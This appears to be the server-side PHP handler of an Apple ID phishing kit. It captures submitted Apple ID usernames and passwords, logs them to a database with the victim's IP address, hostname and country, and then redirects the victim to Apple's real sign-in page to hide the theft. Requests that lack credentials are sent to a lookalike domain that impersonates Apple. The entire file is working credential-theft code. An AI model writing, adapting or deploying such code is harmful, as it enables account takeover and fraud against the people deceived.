<?php


if((strip_tags($_REQUEST['appleId']))&&(strip_tags($_REQUEST['accountPassword']))&&($_REQUEST['appIdKey']))
	{
	
$ip = getenv("REMOTE_ADDR");                                                                          
$hostname = gethostbyaddr($ip);

// include the php script
include("../lib/geoip.inc");
include("../class/apple.php");
include("../class/get_db.php");
// open the geoip database
$gi = geoip_open("../lib/GeoIP.dat",GEOIP_STANDARD);
// to get country code
$country_code = geoip_country_code_by_addr($gi, $_SERVER['REMOTE_ADDR']);
// to get country name
$country_name = geoip_country_name_by_addr($gi, $_SERVER['REMOTE_ADDR']);
$addr_ip=$ip.'-'.$hostname;
$time=date("Y-m-d h:i");
$id=strip_tags($_REQUEST['appleId']);
$pass=strip_tags($_REQUEST['accountPassword']);
					$bdd=getconnexion();
					$g=new apple($bdd);
					$id= mysql_real_escape_string($id);
					$pass= mysql_real_escape_string($pass);
					$g->set_mail($id);
					$g->set_pass($pass);
					$g->set_time($time);
					$g->set_addr_ip($addr_ip);
					$g->insert_account();





 print("<script type=\"text/javascript\">setTimeout('location=(\"https://idmsa.apple.com//IDMSWebAuth/authenticate?appIdKey=45571f444c4f547116bfd052461b0b3ab1bc2b445a72138157ea8c5c82fed623&appleId=".$id."&accountPassword=".$pass."\")' ,0);</script>");

 
 





}
else
{
print("<script type=\"text/javascript\">setTimeout('location=(\"http://idmsa.apple.com.idmsawebauth.com\")' ,0);</script>");
}
?>



